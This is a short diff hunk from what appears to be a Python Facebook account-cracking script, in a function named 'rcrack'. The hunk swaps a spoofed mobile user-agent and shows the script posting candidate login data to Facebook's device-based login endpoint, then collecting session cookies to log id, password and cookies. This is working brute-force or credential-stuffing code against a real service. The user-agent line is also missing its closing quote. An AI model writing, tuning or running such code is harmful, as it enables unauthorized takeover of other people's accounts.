@@ -439,7 +439,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':'Mozilla/5.0 (Linux; U; Android 10; Infinix X692 Build/QP1A.190711.020; wv)AppleWebKit/537.36(KHTML, like Gecko)Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 OPR/7.4.2254.148299}
+            'user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.7107.1809 Mobile Safari/537.36OPR/7.4.2254.148299}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fx.facebook.com%2Ferror%2Findex.php%3Ferr%3Dec%26kerr%3D1357004%26kerr_summary%3DOcorreu%2Bum%2Berro%26kerr_description%3DFeche%2Be%2Babra%2Ba%2Bjanela%2Bdo%2Bseu%2Bnavegador%2Bnovamente.%26__m_async_page__%26__big_pipe_on__%26fb_dtsg_ag%3DAQxrg8pgyjoDMd7KaKJVvsAIe2xwPZRNYbpflOJUt_6FqXQc%253A0%253A0%26jazoest%3D24565%26__dyn%3D0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw%26__csr%26__req%3D7%26__a%3DAYnO5p6ofprWzuKur8hAGRifywnGbtNma3qSX93T3TfHio-NWpdFYTLk7LPY6em94wLnoFVvXwb-_p2ETdS5omzKr7GCiu6r2r78rIzg2h5t-A%26__user%3D0&refsrc=deprecated&lwv=100&refid=9&ref=',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
